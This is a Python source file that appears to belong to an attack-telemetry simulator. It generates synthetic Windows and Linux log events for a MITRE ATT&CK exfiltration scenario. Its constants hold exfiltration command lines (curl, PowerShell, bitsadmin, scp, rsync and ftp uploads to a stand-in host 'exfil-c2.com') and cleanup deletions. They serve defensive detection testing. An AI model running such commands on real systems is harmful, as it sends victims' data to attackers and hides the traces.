from typing import Dict, Final, List, Tuple
# pyrefly: ignore [missing-import]
from loguru import logger

from shared.schemas.ecs.base import Process
from simulator.attack_scenarios.base import ScenarioBase, ScenarioMetadata
from simulator.config.entities import EntityManager, SimulationConfig
from simulator.generators.base import BaseGenerator

# --- Windows Exfiltration Command Constants ---
WIN_CURL_EXFIL: Final[str] = "curl.exe -F 'file=@C:\\Users\\Public\\staged.zip' http://exfil-c2.com/upload"
WIN_PS_EXFIL: Final[str] = "Invoke-WebRequest -Uri http://exfil-c2.com/staged.zip -Method Put -InFile C:\\Users\\Public\\staged.zip"
WIN_CERTUTIL_EXFIL: Final[str] = "certutil.exe -encode C:\\Users\\Public\\staged.zip C:\\Users\\Public\\staged.b64"
WIN_BITS_EXFIL: Final[str] = "bitsadmin.exe /transfer exfil /upload /priority high http://exfil-c2.com/upload C:\\Users\\Public\\staged.zip"
WIN_CLEANUP: Final[str] = "cmd.exe /c del C:\\Users\\Public\\staged.zip"

# --- Linux Exfiltration Command Constants ---
NIX_SCP_EXFIL: Final[str] = "scp /tmp/staged.tar.gz attacker@exfil-c2.com:/tmp/staged.tar.gz"
NIX_CURL_EXFIL: Final[str] = "curl -T /tmp/staged.tar.gz ftp://exfil-c2.com --user anon:anon"
NIX_RSYNC_EXFIL: Final[str] = "rsync -az /tmp/staged.tar.gz attacker@exfil-c2.com:/home/attacker/"
NIX_CLEANUP: Final[str] = "rm /tmp/staged.tar.gz"

# --- Timing Constants (Seconds) ---
WAIT_AUTH: Final[Tuple[float, float]] = (2.0, 5.0)
WAIT_EXFIL: Final[Tuple[float, float]] = (15.0, 45.0)
WAIT_CLEANUP: Final[Tuple[float, float]] = (5.0, 10.0)

class ExfiltrationScenario(ScenarioBase):
    """
    Simulates MITRE ATT&CK Exfiltration (TA0010).
    Orchestrates telemetry for sending staged data to an external adversary-controlled system.
    """

    def __init__(
        self,
        entity_manager: EntityManager,
        config: SimulationConfig,
        generators: Dict[str, BaseGenerator]
    ):
        metadata = ScenarioMetadata(
            name="Data Exfiltration via Web and Alternative Protocols",
            description="Simulates exfiltration of staged archives using HTTP, FTP, and secure copy protocols.",
            mitre_tactics=["Exfiltration"],
            mitre_techniques=["T1041", "T1048.003", "T1567", "T1105", "T1020"],
            supported_platforms=["windows", "linux"],
            version="1.0.0"
        )
        super().__init__(metadata, entity_manager, config, generators)

    def execute(self) -> None:
        """Main dispatcher for the exfiltration scenario."""
        self._validate_state()
        platform = self.victim_host.os_family.strip().lower()
        
        log = logger.bind(
            technique="TA0010",
            host=self.victim_host.hostname,
            user=self.victim_user.name,
            platform=platform
        )
        log.info(f"Initiating Exfiltration sequence on {self.victim_host.hostname}")

        if platform == "windows":
            self._execute_windows_sequence(self.generators["windows"])
        elif platform == "linux":
            self._execute_linux_sequence(self.generators["linux"])
        else:
            raise RuntimeError(f"Unsupported platform for exfiltration: {platform}")

        log.info("Exfiltration scenario successfully completed.")

    def _execute_windows_sequence(self, gen: BaseGenerator) -> None:
        """Orchestrates Windows exfiltration: Auth -> Multi-method Upload -> Cleanup."""
        self._wait(WAIT_AUTH)
        self.add_event(gen.generate_4624(self.victim_host, self.victim_user))
        
        self._win_http_exfil(gen)
        self._win_powershell_exfil(gen)
        self._win_alternative_exfil(gen)
        self._win_cleanup(gen)

    def _execute_linux_sequence(self, gen: BaseGenerator) -> None:
        """Orchestrates Linux exfiltration: SSH Login -> SCP/CURL/RSYNC -> Cleanup."""
        self._wait(WAIT_AUTH)
        ip = str(self._rng.choice(self.attacker.ip_pool))
        self.add_event(gen.generate_ssh_login(self.victim_host, self.victim_user, True, ip))
        
        self._nix_scp_exfil(gen)
        self._nix_curl_exfil(gen)
        self._nix_rsync_exfil(gen)
        self._nix_cleanup(gen)

    # --- Windows Helpers ---

    def _win_http_exfil(self, gen: BaseGenerator) -> None:
        """SOC Insight: Models T1041. Web exfiltration via standard CLI tools (4688)."""
        logger.bind(technique="T1041").info("Preparing HTTP exfiltration via curl.exe")
        self._wait(WAIT_EXFIL)
        self._emit_win_proc(gen, "curl.exe", "C:\\Windows\\System32\\curl.exe", WIN_CURL_EXFIL)

    def _win_powershell_exfil(self, gen: BaseGenerator) -> None:
        """SOC Insight: Models T1020. Scripted exfiltration via PowerShell WebClient/IWR (4104)."""
        logger.bind(technique="T1020").info("Uploading archive via PowerShell Invoke-WebRequest")
        self._wait(WAIT_EXFIL)
        self.add_event(gen.generate_4104(self.victim_host, self.victim_user, WIN_PS_EXFIL))

    def _win_alternative_exfil(self, gen: BaseGenerator) -> None:
        """SOC Insight: Models T1105. Abuse of ingress/egress tools like certutil or bitsadmin (4688)."""
        logger.bind(technique="T1105").info("Transferring data via bitsadmin and certutil abuse")
        self._wait(WAIT_EXFIL)
        self._emit_win_proc(gen, "bitsadmin.exe", "C:\\Windows\\System32\\bitsadmin.exe", WIN_BITS_EXFIL)
        self._wait(WAIT_AUTH)
        self._emit_win_proc(gen, "certutil.exe", "C:\\Windows\\System32\\certutil.exe", WIN_CERTUTIL_EXFIL)

    def _win_cleanup(self, gen: BaseGenerator) -> None:
        """SOC Insight: Models Defense Evasion post-exfiltration by removing staged artifacts (4688)."""
        logger.info("Cleaning artifacts from staging directory")
        self._wait(WAIT_CLEANUP)
        self._emit_win_proc(gen, "cmd.exe", "C:\\Windows\\System32\\cmd.exe", WIN_CLEANUP)

    # --- Linux Helpers ---

    def _nix_scp_exfil(self, gen: BaseGenerator) -> None:
        """SOC Insight: Models T1048.003. Exfiltration over SSH/SCP (Auditd EXECVE)."""
        logger.bind(technique="T1048.003").info("Uploading archive via scp")
        self._wait(WAIT_EXFIL)
        self.add_event(gen.generate_auditd_exec(self.victim_host, self.victim_user, NIX_SCP_EXFIL))

    def _nix_curl_exfil(self, gen: BaseGenerator) -> None:
        """SOC Insight: Models T1041. Data transfer via CURL/FTP (Auditd EXECVE)."""
        logger.bind(technique="T1041").info("Sending data via curl/ftp")
        self._wait(WAIT_EXFIL)
        self.add_event(gen.generate_auditd_exec(self.victim_host, self.victim_user, NIX_CURL_EXFIL))

    def _nix_rsync_exfil(self, gen: BaseGenerator) -> None:
        """SOC Insight: Models T1567. Exfiltration via alternative protocols like rsync (Auditd EXECVE)."""
        logger.bind(technique="T1567").info("Synchronizing data to remote C2 via rsync")
        self._wait(WAIT_EXFIL)
        self.add_event(gen.generate_auditd_exec(self.victim_host, self.victim_user, NIX_RSYNC_EXFIL))

    def _nix_cleanup(self, gen: BaseGenerator) -> None:
        """SOC Insight: Models log/artifact cleanup post-collection."""
        logger.info("Removing temporary exfiltration artifacts")
        self._wait(WAIT_CLEANUP)
        self.add_event(gen.generate_auditd_exec(self.victim_host, self.victim_user, NIX_CLEANUP))

    # --- Reusable Utilities ---

    def _emit_win_proc(self, gen: BaseGenerator, name: str, path: str, cmd: str) -> None:
        """Constructs and emits a Windows process creation event (4688)."""
        proc = Process(
            pid=self._rng.randint(1000, 9999),
            name=name,
            executable=path,
            command_line=cmd
        )
        self.add_event(gen.generate_4688(self.victim_host, self.victim_user, proc))

    def _wait(self, delay_range: Tuple[float, float]) -> None:
        """Deterministic delay helper."""
        self.advance_time(self._rng.uniform(*delay_range))

    def _validate_state(self) -> None:
        """Ensures all actor context and generators are available."""
        if not all([self.victim_host, self.victim_user, self.attacker]):
            raise RuntimeError("Exfiltration scenario lacks required actor context.")
        if not self.attacker.ip_pool:
            raise RuntimeError(f"Attacker {self.attacker.name} has no IP pool.")
        
        platform = self.victim_host.os_family.strip().lower()
        if platform not in self.generators:
            raise RuntimeError(f"Required generator '{platform}' is missing for exfiltration simulation.")

